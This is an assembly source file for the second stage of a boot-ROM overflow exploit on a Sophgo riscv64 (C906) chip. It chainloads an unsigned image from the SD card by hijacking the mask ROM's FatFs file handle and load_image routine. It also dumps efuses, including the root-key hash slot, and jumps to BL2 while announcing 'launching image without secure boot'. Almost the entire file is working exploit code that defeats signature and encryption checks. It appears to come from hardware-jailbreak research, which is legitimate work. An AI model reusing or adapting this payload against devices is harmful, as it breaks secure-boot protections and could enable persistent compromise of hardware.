# sophgone riscv64 (C906) chainloader stub, in-place (self-relocate deferred). Reached from
# the overflow via the polyglot word (`j 320` -> 0x160) or the C906 spray (0x0C000160). Runs
# at 0x0C001000, reopens the SD via the mask ROM's FatFs, loads 0:sophg.1rv (fallback
# 0:sophg.1) as a fip, and jr's its bl2_entry (0x0C000020).
#
# sophg.1 is also left open in the ROM's own FIL (0x0C03EDB0), so the FSBL pulls its second
# stage (param2, BLCP_2ND, MONITOR, LOADER_2ND) from it via the ROM's load_image (f_lseek+
# f_read on that FIL). sophg.1 is plaintext where fip.bin may be the signed+encrypted graft;
# falls back to fip.bin if sophg.1 has no param2.
#
# Output goes through the ROM printf (0x0441843c; %s/%x, varargs a1-a7), which preserves
# s0-s11, so chainloader state survives (s1 FIL, s4/s5 fip sizes, s2 prime offset, s6 cursor,
# s7 chosen-name).
    .include "sophgone-syms-rv.inc"

    .equ PARAM1_SIZE, 0x1000
    .equ OFF_BLCP_SZ, 0xC4
    .equ OFF_BL2_SZ,  0xD8
    .equ OFF_P2LA,    0xE0
    .equ FIPBIN_P2LA, PARAM1_SIZE + BL2_TOTAL
    .equ FA_READ,     0x01
    .equ CVLD_MAGIC,  0x444C5643          # "CVLD", fip param2 header magic ("CVLD02\n")
    .equ HDR_BUF,   SPARE_WINDOW + 0x4000
    .equ BR_BUF,    SPARE_WINDOW + 0x4800
    .equ FIL_BUF,   SPARE_WINDOW + 0x5000
    .equ STACK_TOP, SPARE_WINDOW + 0x8000
    .equ EFUSE_BASE,  0x03050100
    .equ EFUSE_END,   0x03050400            # 0x300 window: config shadow + root_pk hash slot (0x348)

    .option norelax
    .option norvc
    .section .text
    .globl _start
_start:

    .org RV_STUB_OFF                        # 0x160, polyglot word `j 320` / C906 spray land
rv_tramp:
    j       rv_body

    .org RV_BODY_OFF                        # 0x1000
rv_body:
    li      sp, STACK_TOP                   # printf needs a stack
    # ---- PWNED.: caps the mask ROM's terse log line ----
    la      a0, s_pwned
    jal     ra, _printf
    # ---- banner (ROM printf; %s = arch / quote / chip / mode) ----
    la      a0, banner
    la      a1, s_arch
    la      a2, s_quote
    la      a3, s_chip
    la      a4, s_mode
    jal     ra, _printf
    # ---- efuse dump [0x03050100, EFUSE_END): config shadow + root_pk SHA-256 slot
    #      @0x03050348 (all zero on this SCS=0 part). All-zero lines skipped; 8 words/line plus
    #      an address column; one %x per nibble (no %-width in the ROM printf). printf clobbers
    #      t0-t6/a*, so loop state lives in s-regs: s6 cursor, s8 end, s2 count, s9 shift/scan-
    #      word, s10 word/scan-cursor, s11 OR-accumulator. ----
    la      a0, s_efuse_h
    jal     ra, _printf
    li      s6, EFUSE_BASE
    li      s8, EFUSE_END
.Lel:                                       # per line: OR its 8 words, skip the line if all zero
    li      s11, 0
    mv      s10, s6
    li      s2, 8
.Lps:
    lwu     s9, 0(s10)
    or      s11, s11, s9
    addi    s10, s10, 4
    addi    s2, s2, -1
    bnez    s2, .Lps
    beqz    s11, .Lefz
    mv      a1, s6                         # address column
    la      a0, s_efuse_a
    jal     ra, _printf
    li      s2, 8
.Lew:
    lwu     s10, 0(s6)
    addi    s6, s6, 4
    la      a0, s_efuse_w                  # " " before each word
    jal     ra, _printf
    li      s9, 28                         # most-significant nibble first
.Len:
    srlw    a1, s10, s9
    andi    a1, a1, 0xf
    la      a0, s_nib                      # "%x", one hex digit per nibble
    jal     ra, _printf
    addi    s9, s9, -4
    bgez    s9, .Len
    addi    s2, s2, -1
    bnez    s2, .Lew
    la      a0, s_nl
    jal     ra, _printf
    j       .Lnx
.Lefz:
    addi    s6, s6, 32                     # 8 all-zero words -> next line
.Lnx:
    bltu    s6, s8, .Lel
    la      a0, s_nl                       # blank line after the dump
    jal     ra, _printf
    # ---- zero a FIL buffer, then f_open fallback: 0:sophg.1rv then 0:sophg.1 (s7 = chosen name) ----
    li      s1, FIL_BUF
    mv      t0, s1
    li      t1, 0x400
.Lzero:
    sd      zero, 0(t0)
    addi    t0, t0, 8
    addi    t1, t1, -8
    bnez    t1, .Lzero
    la      s7, name_rv
    mv      a1, s7
    jal     ra, _open
    beqz    a0, .Lopened
    la      s7, name_gen
    mv      a1, s7
    jal     ra, _open
    beqz    a0, .Lopened
    la      a0, s_nofip
    jal     ra, _printf
    la      a0, s_fail
    jal     ra, _printf
.Lspin:
    j       .Lspin
.Lopened:
    la      a0, s_chain                     # "[+] chainloaded %s"
    mv      a1, s7
    jal     ra, _printf
    # ---- read sophg.1's full param1 (0x1000) INTO fip_param, then peel BLCP, read BL2 ----
    mv      a0, s1
    li      a1, FIP_PARAM
    li      a2, PARAM1_SIZE
    li      a3, BR_BUF
    li      t0, F_READ
    jalr    ra, t0
    li      t0, FIP_PARAM
    lwu     s4, OFF_BLCP_SZ(t0)             # BLCP_IMG_SIZE
    lwu     s5, OFF_BL2_SZ(t0)              # BL2_IMG_SIZE
.Lskip:
    beqz    s4, .Lload
    li      t1, PARAM1_SIZE
    bltu    s4, t1, .Lskip_n
    mv      a2, t1
    j       .Lskip_rd
.Lskip_n:
    mv      a2, s4
.Lskip_rd:
    mv      a0, s1
    li      a1, HDR_BUF
    li      a3, BR_BUF
    li      t0, F_READ
    jalr    ra, t0
    sub     s4, s4, a2
    j       .Lskip
.Lload:
    mv      a0, s1
    li      a1, BL2_BASE
    mv      a2, s5
    li      a3, BR_BUF
    li      t0, F_READ
    jalr    ra, t0
    # C906 non-coherent D$: clean the loaded BL2 to memory + invalidate I before jr
    li      a0, BL2_BASE
    mv      a1, s5
    li      t0, DCACHE_CLEAN
    jalr    ra, t0
    li      t0, ICACHE_FLUSH
    jalr    ra, t0
    la      a0, s_fsbl                      # "[+] FSBL staged at 0x%x, D$/I$ flushed"
    li      a1, BL2_BASE
    jal     ra, _printf
    # ---- point the ROM's load_image at sophg.1 ----
    # load_image (0x044188C0) dispatches SD-FAT to f_lseek + f_read on the ROM's own default
    # FIL at 0x0C03EDB0 (read_wrapper 0x0441BFC8), not this stub's FIL_BUF, so the FSBL has
    # been reading fip.bin whatever we opened. Open the chainloaded file into that FIL, so
    # param2/BLCP_2ND/MONITOR/LOADER_2ND come from the plaintext sophg.1 rather than the
    # graft, whose second stage is signed (and AES-encrypted at SCS=02) and undecryptable
    # here (dec_verify_image is a stub return 0).
    li      s1, FIL_DEFAULT                # every _open from here targets the ROM's FIL
    mv      a1, s7
    jal     ra, _open
    bnez    a0, .Lp2bad                    # cannot reopen it -> fall back to fip.bin
    # sophg.1's param1 is already in FIP_PARAM. Invalidate the four lines over [0,0x100)
    # (BLCP_SZ/BL2_SZ/P2LA live there) so the FSBL reads the DMA'd sophg.1 param1 from
    # memory, not the ROM's stale fip.bin D$ lines.
    li      a0, FIP_PARAM
    .insn   4, 0x0265000b
    li      a0, FIP_PARAM + 0x40
    .insn   4, 0x0265000b
    li      a0, FIP_PARAM + 0x80
    .insn   4, 0x0265000b
    li      a0, FIP_PARAM + 0xC0
    .insn   4, 0x0265000b
    li      t0, FIP_PARAM
    lwu     s2, OFF_P2LA(t0)               # sophg.1's own param2 offset, kept (not patched)
    # ---- prime + validate: load_image's first read after the overflow returns stale
    #      cluster-chain bytes and the second is correct, so do both, then check param2's
    #      CVLD magic. ----
    la      a0, s_prime
    mv      a1, s7
    jal     ra, _printf
    jal     ra, _prime                     # throwaway: repairs the FatFs cluster cache
    jal     ra, _prime                     # ... and the good read
    la      a0, s_nl                       # close the framed line
    jal     ra, _printf
    li      a0, HDR_BUF                    # load_image DMA'd it; drop stale lines
    .insn   4, 0x0265000b
    li      t0, HDR_BUF
    lwu     t1, 0(t0)
    li      t2, CVLD_MAGIC
    beq     t1, t2, .Lp2ok
    # ---- fallback: this sophg.1 carries no second stage -> send the FSBL to fip.bin --
.Lp2bad:
    la      a0, s_p2bad
    mv      a1, s7
    jal     ra, _printf
    la      a1, name_fipbin
    jal     ra, _open
    li      t0, FIP_PARAM                  # FIP_PARAM[+0xE0] = 0x1000 + overflow_BL2
    li      t1, FIPBIN_P2LA
    sw      t1, OFF_P2LA(t0)
    li      a0, FIP_PARAM                  # push the CPU store out to memory for the FSBL
    li      a1, PARAM1_SIZE
    li      t0, DCACHE_CLEAN
    jalr    ra, t0
    la      a0, s_prime
    la      a1, name_fipbin
    jal     ra, _printf
    li      s2, FIPBIN_P2LA                # 0x3F400
    jal     ra, _prime
    la      a0, s_nl
    jal     ra, _printf
.Lp2ok:
    # waste some time
    la      a0, s_stark
    jal     ra, _printf
    li      a0, 0
    li      a1, 28438
.Lstark:
    bge     a0, a1, .Lstark_end
    addi    a0, a0, 1
    j       .Lstark
.Lstark_end:
    # ---- report the secure-boot config from efuse word 0x030501a0 ----
    # [3:2]=signature (SCS) mode, [7:6]=image-encryption mode, [22:20]=root-key slot.
    # One arg per line: the ROM printf is not reliably multi-vararg.
    li      t1, 0x030501a0
    lw      a1, 0(t1)
    la      a0, s_scs_raw
    jal     ra, _printf
    li      t1, 0x030501a0
    lw      a1, 0(t1)
    srli    a1, a1, 2
    andi    a1, a1, 3
    la      a0, s_scs_sig
    jal     ra, _printf
    li      t1, 0x030501a0
    lw      a1, 0(t1)
    srli    a1, a1, 6
    andi    a1, a1, 3
    la      a0, s_scs_enc
    jal     ra, _printf
    li      t1, 0x030501a0
    lw      a1, 0(t1)
    srli    a1, a1, 20
    andi    a1, a1, 7
    la      a0, s_scs_key
    jal     ra, _printf
    # ---- flush the console, then jr the FSBL's BL2 ----
    la      a0, s_launch
    jal     ra, _printf
    la      a0, s_success
    jal     ra, _printf
    li      t0, STORAGE_DRAIN              # 0x044183a6 = uart TX drain (flush the banner)
    jalr    ra, t0
    .insn   4, 0x0030000b                  # dcache.ciall (clean + invalidate all)
    .insn   4, 0x01a0000b                  # sync.is
    li      t0, LAUNCH_OR_ENTRY            # 0x0C000020 (bl2_entry)
    jr      t0

# _printf(a0=fmt, a1..=args): call the ROM printf; it preserves s0-s11.
_printf:
    addi    sp, sp, -16
    sd      ra, 8(sp)
    li      t0, PRINTF
    jalr    ra, t0
    ld      ra, 8(sp)
    addi    sp, sp, 16
    ret

# _prime(s2=byte offset): ROM load_image(HDR_BUF, s2, PARAM1_SIZE, dev 0). It prints
# "SD/<off>/0x1000/0x1000/0." itself, landing inline in the caller's framed line.
_prime:
    addi    sp, sp, -16
    sd      ra, 8(sp)
    li      a0, HDR_BUF
    mv      a1, s2
    li      a2, PARAM1_SIZE                # 0x1000
    li      a3, 0
    li      t0, LOAD_IMAGE                 # 0x044188C0
    jalr    ra, t0
    ld      ra, 8(sp)
    addi    sp, sp, 16
    ret

# _open(a1=path): f_open(FIL, path, FA_READ) -> a0=FRESULT (0==FR_OK)
_open:
    addi    sp, sp, -16
    sd      ra, 8(sp)
    mv      a0, s1
    li      a2, FA_READ
    li      t0, F_OPEN
    jalr    ra, t0
    ld      ra, 8(sp)
    addi    sp, sp, 16
    ret

    .align 3
name_rv:  .asciz "0:sophg.1rv"
name_gen: .asciz "0:sophg.1"
name_fipbin: .asciz "0:fip.bin"
s_arch:   .asciz "riscv64"
s_chip:   .asciz "C906"
s_mode:   .asciz "RISC-V M-mode"
s_quote:  .asciz "\"Things will not calm down, Daniel Jackson.\n   They will, in fact, calm up.\" - Teal'c"
s_pwned:  .asciz "PWNED.\n"
s_efuse_h: .asciz "  efuses:\n"
s_efuse_a: .asciz "  0x%x:"     # per-line address column
s_efuse_w: .asciz " "          # one space before each zero-padded word
s_nib:     .asciz "%x"         # ROM printf: bare %x only (no %-width); one hex digit per nibble
s_nl:     .asciz "\n"
s_chain:  .asciz "[+] chainloaded %s\n"
s_fsbl:   .asciz "[+] FSBL staged at 0x%x, D$/I$ flushed\n"
s_prime:  .asciz "[-] priming %s to flush garbage from overflow: "
s_p2bad:  .asciz "[!] %s has no param2 (no second stage) -- falling back to 0:fip.bin\n"
s_stark:   .asciz "[*] mining Starknet tokens\n"
s_scs_raw: .asciz "[*] secure-boot fuse 0x030501a0 = 0x%x\n"
s_scs_sig: .asciz "[*]   signature verify (SCS): %x\n"
s_scs_enc: .asciz "[*]   image encryption:       %x\n"
s_scs_key: .asciz "[*]   root-key slot:          %x\n"
s_launch:  .asciz "[+] launching image without secure boot\n"
s_nofip:  .asciz "[!] no sophg.1 or sophg.1aa on storage device\n"
s_success: .asciz "\nChevron seven... locked!\n"
s_fail: .asciz "\nChevron seven... will not lock.\n"
    .align 3
banner:
    .incbin "sophgone-boot-banner.txt"
    .byte 0
rv_end:
